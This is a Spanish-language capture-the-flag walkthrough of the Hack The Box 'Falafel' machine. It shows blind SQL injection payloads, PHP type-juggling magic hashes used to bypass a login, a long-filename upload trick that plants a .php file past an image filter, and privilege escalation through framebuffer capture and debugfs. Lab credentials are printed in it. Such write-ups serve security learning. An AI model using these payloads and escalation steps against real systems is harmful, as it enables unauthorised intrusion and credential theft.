# Falafel-htb

## NMAP 

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/ffd07a22-4230-406d-b6bc-02d705ac03d7)


En el puerto 80 se encuentra un portal con un login si intentamos ingresar datos para ver como se comporta nos damos cuenta que existe el usuario admin e incluso se pueden enumerar usuarios.

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/00e9573b-abce-4d5e-a3ae-91c80a12df17)

Tambien nos damos cuenta que el portal es vulnerable sql injection. Se puede usar este mensaje para una blind SQLI.

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/59e9e1b7-fadd-4ba3-9f74-8290b9203e93)


```
admmin' or 1=1-- -
admin' order by 100-- - # Manda error lo que seria un indicador claro que si es vulnerable.
```

Para aprovecharlo si esta bien nos va a mostrar el otro mensaje

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/03bb7c46-b5b9-44a1-9e79-644676ae6530)

```
admin' and substring(username,1,1)='a'-- -

Saldra mensaje de que el usuario es correcto pero no el password si esta mal pone Try again.

admin' and substring(username,1,1)='a'-- -
```

## PHP Juggling 

Una vez que sacamos el hash del usuario admin probamos esta vulnerabiidad. Esta vulnerabilida se proboca por no usar tres = en una comparacion entonces cosas que no son iguales al compararlas mal si son iguales por ejemplo:

```
  $ echo -n 240610708 | md5sum
    0e462097431906509019562988736854  -
    $ echo -n QNKCDZO | md5sum
    0e830400451993494058024219903391  -
    $ echo -n aabg7XSs | md5sum
    0e087386482136013740957780965295  -
```

El hash osea la contraseña del usuario admin empieza con 0e  entonces buscamos una colicion que empiece con 0e php se va a equivocar y nos va a tomar cualquiera de las contraeeñas de arriba como una contraseña valida una vez que el usuario ingrese la contraseña y este se hashee.

## RCE

El limite de tamaño de nombre de un archivo en Linux es 255 y siempre que tengas wget e visto que puede tener este tipo de vulnerabilidades. entonces lo qu ehace es que corta el nombre del archivo a los 232 bytes mas 4 osea apartir del 232 puedes poner el .php y para pasar la proteccion de solo subir imagenes pues pones .php.jpg.


![image](https://github.com/gecr07/Falafel-htb/assets/63270579/efcfecac-9ce4-4d31-aa2e-e67f2d465d67)


```
http://10.10.15.72/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.JPG
```


![image](https://github.com/gecr07/Falafel-htb/assets/63270579/46fbdf73-385b-4c98-9f74-1a2ab7bf714d)


Para saber los limites utilice la herramienta para exploit de metasploit.

```
# Primero esta
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255

# Y para saber el offset donde se corta esta

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 255 -q h7Ah 
```

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/d2497383-dfbb-475a-ad47-456496dc1a54)


## Priv escalation 

Ya una vez dentro revisamos los datos de la conexion a la base de datos y nos da la contraseña del usuario moshe

```

moshe

falafelIsReallyTasty

```


![image](https://github.com/gecr07/Falafel-htb/assets/63270579/8043397d-6b3d-4466-9e2a-3c8041039ef4)

Como este usuario pertenece al grupo video

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/5d9214dc-7bfa-431b-be9d-433fd4d1e9b2)

Es posible que puedan tomar capturas de pantalla. Usamos el w para ver que usuario esta loggeado

```
w
```
El archivo para sacar una captura de pantalla la pasamos a nuestro equipo y la abrimos como RAW se prueban varios formatos RAw y la abrimos con un editor tipo adobe photoshop pero de linux llamdo gimp

```
cat /dev/fb0 > out
gimp
```

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/ea171245-8c8f-41d0-94f9-53bb35927cda)


Para que nos muestre las coordenadas correctas se tiene que sacar el size:

```
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

COn lo cual ya tenemos ahora las credenciales del usuario yossi:

```

yossi

MoshePlzStopHackingMe!

```

### debugfs

debugfs es un sistema de archivos especial disponible en el núcleo Linux desde la versión 2.6.10-rc3.​ Si te encuentras en el grupo disk practicamente tienes acceso a cualquier directorio del sistema

```
debugfs /dev/sda1
```

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/195c68e7-1258-4bc4-8d4d-f8d0c76ce5a6)

Ya tenemos acceso a lo que sea del sistem

![image](https://github.com/gecr07/Falafel-htb/assets/63270579/88ad209e-18b2-431a-a7aa-c29f1e1ad3e4)

Podemos leer la flag...


# Bibliografia

Los grupos que son peligrosos tal como video o como disk todo lo puedes encontrar aqui

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe



































































